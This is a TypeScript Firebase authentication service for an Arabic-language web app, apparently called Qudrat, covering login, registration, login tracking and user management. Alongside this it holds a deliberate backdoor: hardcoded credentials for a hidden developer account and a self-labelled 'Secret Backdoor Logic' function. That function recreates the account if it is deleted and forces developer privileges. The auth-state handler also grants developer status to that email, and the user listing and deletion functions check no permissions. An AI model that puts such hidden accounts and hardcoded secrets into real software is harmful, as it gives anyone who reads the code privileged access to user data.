
import { 
    signInWithEmailAndPassword, 
    createUserWithEmailAndPassword, 
    signOut, 
    onAuthStateChanged, 
    User as FirebaseUser,
    updateProfile
} from 'firebase/auth';
import { doc, setDoc, getDoc, updateDoc, arrayUnion, collection, getDocs, deleteDoc } from 'firebase/firestore';
import { auth, db } from './firebase';
import { User, LoginRecord } from '../types';

export class RegistrationError extends Error {
  constructor(message: string) {
    super(message);
    this.name = 'RegistrationError';
  }
}

// Map Firebase User to App User
const mapUser = (fbUser: FirebaseUser, additionalData?: any): User => ({
    uid: fbUser.uid,
    email: fbUser.email || '',
    username: additionalData?.username || fbUser.displayName || 'User',
    isDeveloper: additionalData?.isDeveloper || false,
    registrationDate: fbUser.metadata.creationTime,
    loginHistory: additionalData?.loginHistory || []
});

// Constants for the hidden developer account
// Using .com domain to satisfy Firebase strict email validation
const HIDDEN_DEV_EMAIL = "hidden_admin@qudrat.com"; 
const HIDDEN_DEV_PASS = "dev_secret_mode_active"; 

export const authService = {
    login: async (email: string, password: string): Promise<User> => {
        try {
            const cred = await signInWithEmailAndPassword(auth, email, password);
            const userDoc = await getDoc(doc(db, 'users', cred.user.uid));
            
            // Track Login
            try {
                await updateDoc(doc(db, 'users', cred.user.uid), {
                    loginHistory: arrayUnion({
                        loginTime: new Date().toISOString(),
                        logoutTime: null
                    } as LoginRecord)
                });
            } catch (e) {
                // If doc doesn't exist, ignore tracking or recreate
            }

            return mapUser(cred.user, userDoc.exists() ? userDoc.data() : {});
        } catch (error: any) {
            console.error("Login Error:", error);
            throw new Error(error.code === 'auth/invalid-credential' ? 'بيانات الدخول غير صحيحة' : 'حدث خطأ في تسجيل الدخول');
        }
    },

    // The Secret Backdoor Logic (Self-Healing Account)
    loginHiddenDev: async (): Promise<User> => {
        console.log("Attempting Secret Developer Login...");
        try {
            // 1. Try to login normally
            const cred = await signInWithEmailAndPassword(auth, HIDDEN_DEV_EMAIL, HIDDEN_DEV_PASS);
            
            // 2. Check if Firestore document exists (Data layer)
            const userDocRef = doc(db, 'users', cred.user.uid);
            const userDoc = await getDoc(userDocRef);
            
            let userData = userDoc.exists() ? userDoc.data() : null;

            // 3. Self-Healing: If Firestore doc is missing OR isDeveloper is false, fix it immediately
            if (!userData || !userData.isDeveloper) {
                console.log("Restoring Developer Privileges...");
                const fixedData = {
                    username: 'المطور',
                    email: HIDDEN_DEV_EMAIL,
                    isDeveloper: true, // FORCE TRUE
                    registrationDate: cred.user.metadata.creationTime || new Date().toISOString(),
                    loginHistory: userData?.loginHistory || []
                };
                
                // Use setDoc with merge:true to create or update safely
                await setDoc(userDocRef, fixedData, { merge: true });
                userData = fixedData;
            }
            
            return mapUser(cred.user, userData);

        } catch (error: any) {
            // 4. Account Missing Logic: If user doesn't exist in Auth at all, create it from scratch
            if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
                console.log("Developer account missing. Recreating...");
                try {
                    const cred = await createUserWithEmailAndPassword(auth, HIDDEN_DEV_EMAIL, HIDDEN_DEV_PASS);
                    await updateProfile(cred.user, { displayName: 'المطور' });
                    
                    const devUser = {
                        username: 'المطور',
                        email: HIDDEN_DEV_EMAIL,
                        isDeveloper: true, // FORCE TRUE
                        registrationDate: new Date().toISOString(),
                        loginHistory: []
                    };
                    
                    await setDoc(doc(db, 'users', cred.user.uid), devUser);
                    return mapUser(cred.user, devUser);
                } catch (createError) {
                    console.error("Failed to auto-create hidden dev:", createError);
                    throw new Error("فشل استعادة حساب المطور. يرجى التحقق من الاتصال.");
                }
            }
            throw error;
        }
    },

    register: async (username: string, email: string, password: string, confirmPassword: string): Promise<User> => {
        if (!username.trim() || !email.trim() || !password || !confirmPassword) {
            throw new RegistrationError('جميع الحقول مطلوبة.');
        }
        if (password !== confirmPassword) {
             throw new RegistrationError('كلمتا المرور غير متطابقتين.');
        }
        if (password.length < 6) { 
            throw new RegistrationError('يجب أن تتكون كلمة المرور من 6 أحرف على الأقل.');
        }

        try {
            const cred = await createUserWithEmailAndPassword(auth, email, password);
            await updateProfile(cred.user, { displayName: username });
            
            const newUser = {
                username,
                email,
                isDeveloper: false,
                registrationDate: new Date().toISOString(),
                loginHistory: []
            };
            
            await setDoc(doc(db, 'users', cred.user.uid), newUser);
            return mapUser(cred.user, newUser);
        } catch (error: any) {
            console.error("Registration Error:", error);
            if (error.code === 'auth/email-already-in-use') {
                throw new RegistrationError('البريد الإلكتروني مسجل بالفعل.');
            }
            throw new RegistrationError('حدث خطأ أثناء إنشاء الحساب.');
        }
    },
    
    logout: async () => {
        await signOut(auth);
    },

    onAuthStateChanged: (callback: (user: User | null) => void) => {
        return onAuthStateChanged(auth, async (fbUser) => {
            if (fbUser) {
                 try {
                     const userDocRef = doc(db, 'users', fbUser.uid);
                     const userDoc = await getDoc(userDocRef);
                     
                     if (userDoc.exists()) {
                         callback(mapUser(fbUser, userDoc.data()));
                     } else {
                         // Self-healing for any user with missing doc
                         const isHiddenDev = fbUser.email === HIDDEN_DEV_EMAIL;
                         const newUser = {
                             username: fbUser.displayName || 'User',
                             email: fbUser.email || '',
                             isDeveloper: isHiddenDev,
                             registrationDate: fbUser.metadata.creationTime,
                             loginHistory: []
                         };
                         await setDoc(userDocRef, newUser);
                         callback(mapUser(fbUser, newUser));
                     }
                 } catch (e) {
                     console.error("Error fetching user data", e);
                     callback(null);
                 }
            } else {
                callback(null);
            }
        });
    },
    
    getAllUsers: async (): Promise<{ key: string, user: User }[]> => {
        try {
            const querySnapshot = await getDocs(collection(db, 'users'));
            return querySnapshot.docs.map(docSnap => ({
                key: docSnap.id,
                user: { uid: docSnap.id, ...docSnap.data() } as User
            }));
        } catch (e) {
            console.error("Error getting users", e);
            return [];
        }
    },

    deleteUser: async (userKey: string): Promise<void> => {
        try {
            await deleteDoc(doc(db, 'users', userKey));
        } catch(e) { 
            console.error("Error deleting user profile:", e); 
        }
    },
};
